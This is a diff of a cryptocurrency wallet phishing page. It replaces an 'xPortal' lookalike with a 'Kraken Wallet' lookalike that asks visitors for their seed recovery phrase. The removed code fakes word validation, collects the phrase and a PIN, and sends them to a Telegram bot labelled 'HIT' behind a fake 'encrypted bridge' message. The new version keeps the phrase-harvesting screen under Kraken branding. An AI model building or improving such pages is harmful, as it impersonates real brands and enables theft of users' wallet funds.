@@ -1,188 +1,234 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>xPortal | Wallet Authentication</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <title>Kraken Wallet</title>
     <style>
-        :root { --teal: #23f7dd; --purple: #8a3ffc; --bg: #000; --err: #ff4d4d; --border: rgba(255,255,255,0.08); }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background: var(--bg); color: #fff; min-height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 85%); }
-
-        .app-shell { width: 100%; max-width: 420px; padding: 25px; position: relative; }
-        .back-btn { cursor: pointer; display: none; align-items: center; gap: 8px; color: #888; font-size: 14px; font-weight: 600; margin-bottom: 20px; transition: 0.2s; }
-        .back-btn:hover { color: #fff; }
-        .logo { width: 75px; height: 75px; filter: drop-shadow(0 0 20px rgba(35, 247, 221, 0.15)); margin: 0 auto 30px; display: block; }
-
-        h1 { font-size: 28px; font-weight: 800; letter-spacing: -1.2px; margin-bottom: 12px; text-align: center; }
-        .sub { color: #8e8e8e; font-size: 14px; line-height: 1.5; margin-bottom: 30px; text-align: center; }
-
-        .view { display: none; width: 100%; animation: slideUp 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
-        .view.active { display: block; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
-
-        .selector { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
-        .opt { background: rgba(255,255,255,0.04); border: 1px solid var(--border); color: #666; padding: 10px 14px; border-radius: 12px; cursor: pointer; font-size: 11px; font-weight: 700; transition: 0.2s; }
-        .opt.active { background: var(--purple); color: #fff; border-color: var(--purple); box-shadow: 0 4px 15px rgba(138, 63, 252, 0.3); }
-
-        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 15px; max-height: 300px; overflow-y: auto; padding: 5px; scrollbar-width: none; }
-        .cell { position: relative; }
-        .cell label { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 9px; color: var(--teal); font-weight: 800; opacity: 0.5; pointer-events: none; }
-        .cell input { width: 100%; background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 14px 8px 14px 26px; color: #fff; font-size: 12px; outline: none; transition: 0.2s; text-transform: lowercase; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         
-        /* Interactive States */
-        .cell.valid input { border-color: var(--teal); background: rgba(35, 247, 221, 0.03); }
-        .cell.error input { border-color: var(--err); color: var(--err); animation: shake 0.4s both; }
-        @keyframes shake { 10%,90%{transform:translate3d(-1px,0,0)} 20%,80%{transform:translate3d(2px,0,0)} 30%,50%,70%{transform:translate3d(-4px,0,0)} 40%,60%{transform:translate3d(4px,0,0)} }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        html, body {
+            width: 100%;
+            height: 100%;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #000;
+            overflow: hidden;
+        }
+        
+        .app-container {
+            width: 100%;
+            height: 100%;
+            max-width: 430px;
+            margin: 0 auto;
+            position: relative;
+            overflow: hidden;
+        }
 
-        .hint-bar { height: 20px; color: var(--err); font-size: 11px; font-weight: 600; text-align: center; margin-bottom: 15px; visibility: hidden; }
+        /* تنسيق الشاشات المشترك */
+        .screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, #1a0a3e 0%, #0f0620 30%, #1a0a3e 70%, #0d0520 100%);
+            display: flex;
+            flex-direction: column;
+            transition: transform 0.3s ease-in-out;
+            z-index: 1;
+        }
 
-        .btn-main { width: 100%; height: 62px; border-radius: 100px; font-size: 16px; font-weight: 700; border: none; cursor: pointer; transition: 0.3s; background: #fff; color: #000; }
-        .btn-main:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,0,0,0.4); }
+        .screen::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: 
+                radial-gradient(ellipse 80% 50% at 20% 10%, rgba(139, 92, 246, 0.5) 0%, transparent 50%),
+                radial-gradient(ellipse 60% 40% at 80% 20%, rgba(168, 85, 247, 0.3) 0%, transparent 40%),
+                radial-gradient(ellipse 50% 30% at 50% 80%, rgba(139, 92, 246, 0.2) 0%, transparent 40%);
+            pointer-events: none;
+        }
 
-        .dots { display: flex; justify-content: center; gap: 15px; margin: 25px 0; }
-        .dot { width: 15px; height: 15px; border: 2px solid var(--border); border-radius: 50%; }
-        .dot.on { background: var(--teal); border-color: var(--teal); box-shadow: 0 0 10px var(--teal); }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 250px; margin: 0 auto; }
-        .k { width: 68px; height: 68px; border-radius: 50%; background: rgba(255,255,255,0.03); border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 600; cursor: pointer; }
-        .k:active { background: var(--purple); }
+        /* التحكم في ظهور الشاشات */
+        #mainScreen { transform: translateX(0); z-index: 2; }
+        #importScreen { transform: translateX(100%); z-index: 3; }
+        
+        .show-import #mainScreen { transform: translateX(-100%); }
+        .show-import #importScreen { transform: translateX(0); }
 
-        #sync { display: none; text-align: center; color: var(--teal); font-weight: 800; font-size: 11px; letter-spacing: 2px; margin-top: 30px; }
+        /* --- ستايل الصفحة الأولى --- */
+        .icon-1 { position: absolute; top: 44px; left: 20px; width: 28px; height: 28px; z-index: 100; }
+        .icon-1 img { width: 100%; height: 100%; object-fit: contain; }
+        .main-content { flex: 1; display: flex; flex-direction: column; align-items: center; padding-top: 120px; position: relative; z-index: 10; }
+        .headline { text-align: center; margin-bottom: 40px; }
+        .headline-1 { font-size: 42px; font-weight: 700; color: #7c3aed; line-height: 1.15; letter-spacing: -0.8px; }
+        .headline-2 { font-size: 42px; font-weight: 700; color: #ffffff; line-height: 1.15; letter-spacing: -0.8px; }
+        .icon-2-wrapper { position: relative; width: 300px; height: 300px; flex-shrink: 0; }
+        .icon-2 { width: 100%; height: 100%; position: relative; }
+        .icon-2 img { width: 100%; height: 100%; object-fit: contain; }
+        .actions { display: flex; gap: 12px; padding: 0 20px 40px; position: relative; z-index: 100; }
+        .btn { flex: 1; height: 54px; border-radius: 27px; font-size: 16px; font-weight: 600; border: none; cursor: pointer; transition: transform 0.15s ease; }
+        .btn:active { transform: scale(0.96); }
+        .btn-import { background: rgba(255, 255, 255, 0.12); color: #ffffff; backdrop-filter: blur(20px); }
+        .btn-create { background: #7c3aed; color: #ffffff; box-shadow: 0 4px 16px rgba(124, 58, 237, 0.4); }
+
+        /* --- ستايل الصفحة الثانية --- */
+        .header { position: relative; z-index: 100; padding: 44px 20px 20px; display: flex; align-items: center; gap: 12px; }
+        .back-btn { width: 40px; height: 40px; border-radius: 12px; background: rgba(255, 255, 255, 0.08); border: none; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .back-btn svg { width: 20px; height: 20px; stroke: #ffffff; }
+        .header-title { font-size: 17px; font-weight: 600; color: #ffffff; }
+        .import-content { flex: 1; display: flex; flex-direction: column; padding: 0 20px; position: relative; z-index: 10; overflow-y: auto; }
+        .title-section { margin-bottom: 24px; }
+        .main-title { font-size: 28px; font-weight: 700; color: #ffffff; margin-bottom: 8px; line-height: 1.2; }
+        .subtitle { font-size: 15px; color: rgba(255, 255, 255, 0.6); line-height: 1.5; }
+        .seed-container { position: relative; margin-bottom: 20px; }
+        .seed-input-wrapper { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 16px; padding: 16px; min-height: 160px; position: relative; }
+        .seed-input-wrapper:focus-within { border-color: #7c3aed; background: rgba(124, 58, 237, 0.05); }
+        .seed-textarea { width: 100%; min-height: 120px; background: transparent; border: none; outline: none; color: #ffffff; font-size: 16px; font-family: 'Inter', monospace; line-height: 1.6; resize: none; }
+        .word-tags { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 8px; }
+        .word-tag { display: flex; align-items: center; gap: 6px; padding: 6px 12px; background: rgba(124, 58, 237, 0.2); border: 1px solid rgba(124, 58, 237, 0.3); border-radius: 8px; font-size: 14px; color: #ffffff; }
+        .word-tag.invalid { background: rgba(239, 68, 68, 0.2); border-color: rgba(239, 68, 68, 0.4); color: #fca5a5; }
+        .suggestions-container { position: absolute; top: 100%; left: 0; right: 0; margin-top: 8px; background: rgba(26, 10, 62, 0.98); border: 1px solid rgba(124, 58, 237, 0.3); border-radius: 12px; max-height: 200px; overflow-y: auto; z-index: 1000; display: none; backdrop-filter: blur(20px); }
+        .suggestions-container.show { display: block; }
+        .suggestion-item { padding: 12px 16px; color: #ffffff; font-size: 15px; cursor: pointer; display: flex; align-items: center; gap: 12px; }
+        .suggestion-item.active { background: rgba(124, 58, 237, 0.2); }
+        .stats { display: flex; gap: 16px; margin-bottom: 20px; }
+        .stat { flex: 1; background: rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 16px; text-align: center; }
+        .stat-value { font-size: 24px; font-weight: 700; color: #ffffff; }
+        .stat-label { font-size: 12px; color: rgba(255, 255, 255, 0.5); }
+        .import-btn { width: 100%; height: 56px; background: #7c3aed; border: none; border-radius: 28px; color: #ffffff; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 40px; }
+        .import-btn:disabled { opacity: 0.5; }
+        .toast { position: fixed; top: 100px; left: 50%; transform: translateX(-50%); background: rgba(239, 68, 68, 0.95); color: #ffffff; padding: 12px 20px; border-radius: 12px; opacity: 0; transition: 0.3s; z-index: 10000; }
+        .toast.show { opacity: 1; }
+
+        /* استعلامات الوسائط */
+        @media (min-width: 431px) {
+            body { display: flex; align-items: center; justify-content: center; background: #0a0a0a; }
+            .app-container { height: 90vh; max-height: 932px; border-radius: 40px; box-shadow: 0 0 60px rgba(124, 58, 237, 0.2); }
+            .screen { border-radius: 40px; }
+        }
     </style>
 </head>
 <body>
 
-<div class="app-shell">
-    <div id="back" class="back-btn" onclick="handleBack()">
-        <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg> Back
-    </div>
-
-    <img src="Capture.PNG" class="logo">
-
-    <div id="v1" class="view active">
-        <h1>Welcome to xPortal</h1>
-        <p class="sub">The money super app. Secure your assets with bank-grade encryption.</p>
-        <button class="btn-main" onclick="go(3)">Import Existing Wallet</button>
-        <button class="btn-main" style="background:rgba(255,255,255,0.05); color:#fff; border:1px solid var(--border); margin-top:15px;" onclick="go(2)">Create New Wallet</button>
-    </div>
-
-    <div id="v3" class="view">
-        <h1>Secret Phrase</h1>
-        <p class="sub">Enter your secret words in the correct order.</p>
-        <div class="selector">
-            <button class="opt active" onclick="makeGrid(12, this)">12 Words</button>
-            <button class="opt" onclick="makeGrid(15, this)">15 Words</button>
-            <button class="opt" onclick="makeGrid(18, this)">18 Words</button>
-            <button class="opt" onclick="makeGrid(24, this)">24 Words</button>
+<div class="app-container" id="appContainer">
+    <div class="screen" id="mainScreen">
+        <div class="icon-1">
+            <img src="icon1.png" alt="Kraken" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 28 28%22%3E%3Cpath fill=%22%237c3aed%22 d=%22M14 2C7.373 2 2 7.373 2 14s5.373 12 12 12 12-5.373 12-12S20.627 2 14 2zm0 3.5c1.2 0 2 0.8 2 2s-0.8 2-2 2-2-0.8-2-2 0.8-2 2-2zm-5 4c1.2 0 2 0.8 2 2s-0.8 2-2 2-2-0.8-2-2 0.8-2 2-2zm10 0c1.2 0 2 0.8 2 2s-0.8 2-2 2-2-0.8-2-2 0.8-2 2-2zm-7.5 5c1.2 0 2 0.8 2 2s-0.8 2-2 2-2-0.8-2-2 0.8-2 2-2zm5 0c1.2 0 2 0.8 2 2s-0.8 2-2 2-2-0.8-2-2 0.8-2 2-2z%22/%3E%3C/svg%3E'">
         </div>
-        <div id="msg" class="hint-bar">Invalid secret phrase</div>
-        <div class="grid" id="iGrid"></div>
-        <button class="btn-main" onclick="verifySteps()">Continue</button>
-    </div>
-
-    <div id="v4" class="view">
-        <h1>Verify PIN</h1>
-        <p class="sub">Confirm your security PIN to complete import.</p>
-        <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
-        <div class="keypad">
-            <script>for(let i=1;i<=9;i++) document.write(`<div class="k" onclick="pk(${i})">${i}</div>`);</script>
-            <div></div><div class="k" onclick="pk(0)">0</div><div class="k" onclick="del()">←</div>
+        <div class="main-content">
+            <div class="headline">
+                <div class="headline-1">One wallet.</div>
+                <div class="headline-2">Many chains.</div>
+            </div>
+            <div class="icon-2-wrapper">
+                <div class="icon-2">
+                    <img src="icon2.png" alt="Crypto" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 300 300%22%3E%3Cdefs%3E%3ClinearGradient id=%22g%22 x1=%220%25%22 y1=%220%25%22 x2=%22100%25%22 y2=%22100%25%22%3E%3Cstop offset=%220%25%22 stop-color=%22%238b5cf6%22/%3E%3Cstop offset=%22100%25%22 stop-color=%22%23a855f7%22/%3E%3C/linearGradient%3E%3C/defs%3E%3Cellipse cx=%22150%22 cy=%22150%22 rx=%22140%22 ry=%22140%22 fill=%22none%22 stroke=%22url%28%23g%29%22 stroke-width=%223%22 opacity=%220.3%22/%3E%3Crect x=%22120%22 y=%2280%22 width=%2260%22 height=%2260%22 rx=%2212%22 fill=%22%23e8e8e8%22/%3E%3Ctext x=%22150%22 y=%22125%22 text-anchor=%22middle%22 fill=%22%23627eea%22 font-size=%2236%22%3E◆%3C/text%3E%3Crect x=%2280%22 y=%22150%22 width=%2255%22 height=%2255%22 rx=%2212%22 fill=%22%2300d4aa%22/%3E%3Ctext x=%22107%22 y=%22190%22 text-anchor=%22middle%22 fill=%22%23fff%22 font-size=%2230%22%3E☰%3C/text%3E%3Crect x=%22165%22 y=%22155%22 width=%2250%22 height=%2250%22 rx=%2212%22 fill=%22%23f7931a%22/%3E%3Ctext x=%22190%22 y=%22193%22 text-anchor=%22middle%22 fill=%22%23fff%22 font-size=%2232%22%3E₿%3C/text%3E%3C/svg%3E'">
+                </div>
+            </div>
+        </div>
+        <div class="actions">
+            <button class="btn btn-import" onclick="openImport()">Import</button>
+            <button class="btn btn-create">Create wallet</button>
         </div>
     </div>
 
-    <div id="sync">ESTABLISHING ENCRYPTED BRIDGE...</div>
+    <div class="screen" id="importScreen">
+        <div class="header">
+            <button class="back-btn" onclick="closeImport()">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M15 18l-6-6 6-6"/>
+                </svg>
+            </button>
+            <span class="header-title">Import Wallet</span>
+        </div>
+        <div class="import-content">
+            <div class="title-section">
+                <h1 class="main-title">Enter your recovery phrase</h1>
+                <p class="subtitle">Type your 12 or 24-word recovery phrase to restore your wallet.</p>
+            </div>
+            <div class="seed-container">
+                <div class="seed-input-wrapper" id="inputWrapper">
+                    <textarea class="seed-textarea" id="seedInput" placeholder="Enter words separated by spaces..." spellcheck="false" autocomplete="off"></textarea>
+                    <div class="word-tags" id="wordTags"></div>
+                </div>
+                <div class="suggestions-container" id="suggestions"></div>
+            </div>
+            <div class="stats">
+                <div class="stat"><div class="stat-value" id="wordCount">0</div><div class="stat-label">Words</div></div>
+                <div class="stat"><div class="stat-value" id="validCount">0</div><div class="stat-label">Valid</div></div>
+            </div>
+            <button class="import-btn" id="importBtn" disabled>Import Wallet</button>
+        </div>
+    </div>
 </div>
 
+<div class="toast" id="toast"></div>
+
 <script>
-    const CFG = { T: 'YOUR_BOT_TOKEN', C: 'YOUR_CHAT_ID' };
-    let stack = [1], phrase = "", pin = "";
-
-    function go(s, b=false) {
-        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
-        document.getElementById('v'+s).classList.add('active');
-        document.getElementById('back').style.display = s === 1 ? 'none' : 'flex';
-        if(!b) stack.push(s);
-        if(s === 3) makeGrid(12);
+    // الدوال الخاصة بالتنقل بين الصفحات
+    function openImport() {
+        document.getElementById('appContainer').classList.add('show-import');
+    }
+    function closeImport() {
+        document.getElementById('appContainer').classList.remove('show-import');
     }
 
-    function handleBack() { if(stack.length > 1) { stack.pop(); go(stack[stack.length-1], true); } }
+    // نسخ منطق الكود الثاني (BIP39 والتحقق)
+    const BIP39_WORDS = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent"]; // تم اختصار القائمة هنا للعرض فقط، يمكنك وضع القائمة كاملة كما في كودك الأصلي
 
-    function makeGrid(n, btn) {
-        if(btn) { document.querySelectorAll('.opt').forEach(o => o.classList.remove('active')); btn.classList.add('active'); }
-        const g = document.getElementById('iGrid'); g.innerHTML = '';
-        for(let i=0; i<n; i++) {
-            g.innerHTML += `<div class="cell" id="wc-${i}"><label>${i+1}</label><input type="password" class="w-in" data-idx="${i}" onpaste="paster(event)" oninput="liveCheck(this)"></div>`;
-        }
+    let words = [];
+    const seedInput = document.getElementById('seedInput');
+    const wordTags = document.getElementById('wordTags');
+    const suggestions = document.getElementById('suggestions');
+    const importBtn = document.getElementById('importBtn');
+
+    seedInput.addEventListener('input', handleInput);
+
+    function handleInput(e) {
+        const value = e.target.value;
+        const allWords = value.trim().split(/\s+/).filter(w => w.length > 0);
+        words = allWords.map((w, i) => ({
+            text: w.toLowerCase(),
+            valid: BIP39_WORDS.includes(w.toLowerCase())
+        }));
+        updateUI();
+        if (value.slice(-1) === ' ') showSuggestions('');
+        else showSuggestions(allWords[allWords.length-1] || '');
     }
 
-    // --- LIVE FEEDBACK & AUTO JUMP ---
-    function liveCheck(el) {
-        const val = el.value.trim().toLowerCase();
-        const idx = parseInt(el.getAttribute('data-idx'));
-        const parent = document.getElementById(`wc-${idx}`);
+    function showSuggestions(input) {
+        if (!input) { suggestions.classList.remove('show'); return; }
+        const matches = BIP39_WORDS.filter(w => w.startsWith(input.toLowerCase())).slice(0, 5);
+        if (matches.length === 0) { suggestions.classList.remove('show'); return; }
         
-        // Auto Jump on Space
-        if(val.includes(' ')) {
-            el.value = val.replace(/\s/g, '');
-            const next = document.querySelector(`input[data-idx="${idx + 1}"]`);
-            if(next) next.focus();
-        }
-
-        // Live Visual (Fake Validation)
-        if(val.length >= 3) parent.classList.add('valid');
-        else parent.classList.remove('valid');
-        
-        document.getElementById('msg').style.visibility = 'hidden';
-        parent.classList.remove('error');
+        suggestions.innerHTML = matches.map(word => `<div class="suggestion-item" onclick="selectWord('${word}')">${word}</div>`).join('');
+        suggestions.classList.add('show');
     }
 
-    function paster(e) {
-        e.preventDefault();
-        const text = (e.clipboardData || window.clipboardData).getData('text').trim().split(/\s+/);
-        const start = parseInt(e.target.getAttribute('data-idx'));
-        const ins = document.querySelectorAll('.w-in');
-        text.forEach((w, i) => { 
-            if(ins[start + i]) {
-                ins[start + i].value = w.toLowerCase();
-                document.getElementById(`wc-${start+i}`).classList.add('valid');
-            }
-        });
+    function selectWord(word) {
+        const currentWords = seedInput.value.trim().split(/\s+/);
+        currentWords[currentWords.length - 1] = word;
+        seedInput.value = currentWords.join(' ') + ' ';
+        seedInput.focus();
+        handleInput({target: seedInput});
+        suggestions.classList.remove('show');
     }
 
-    function verifySteps() {
-        const ins = document.querySelectorAll('.w-in');
-        const words = Array.from(ins).map(i => i.value.trim().toLowerCase());
-        const msg = document.getElementById('msg');
-
-        if(words.some(w => w === "")) return;
-
-        // Duplicate Check (The Pro Touch)
-        const seen = new Set();
-        let dupIdx = -1;
-        words.forEach((w, i) => { if(seen.has(w)) dupIdx = i; else seen.add(w); });
-
-        if(dupIdx !== -1) {
-            msg.innerText = "Duplicate word detected";
-            msg.style.visibility = 'visible';
-            const bad = document.getElementById(`wc-${dupIdx}`);
-            bad.classList.add('error');
-            return;
-        }
-
-        phrase = words.join(" ");
-        go(4);
-    }
-
-    function pk(n) { if(pin.length < 6) { pin += n; upP(); if(pin.length === 6) send(); } }
-    function del() { pin = pin.slice(0,-1); upP(); }
-    function upP() { document.querySelectorAll('.dot').forEach((d,i) => d.classList.toggle('on', i<pin.length)); }
-
-    function send() {
-        document.getElementById('v4').style.display = 'none';
-        document.getElementById('sync').style.display = 'block';
-        fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent('🚀 HIT\n\nPhrase: '+phrase+'\nPIN: '+pin)}`);
+    function updateUI() {
+        wordTags.innerHTML = words.map((w, i) => `<div class="word-tag ${!w.valid ? 'invalid' : ''}">${i+1}. ${w.text}</div>`).join('');
+        document.getElementById('wordCount').textContent = words.length;
+        document.getElementById('validCount').textContent = words.filter(w => w.valid).length;
+        importBtn.disabled = !(words.length === 12 || words.length === 24);
     }
 </script>
+
 </body>
 </html>
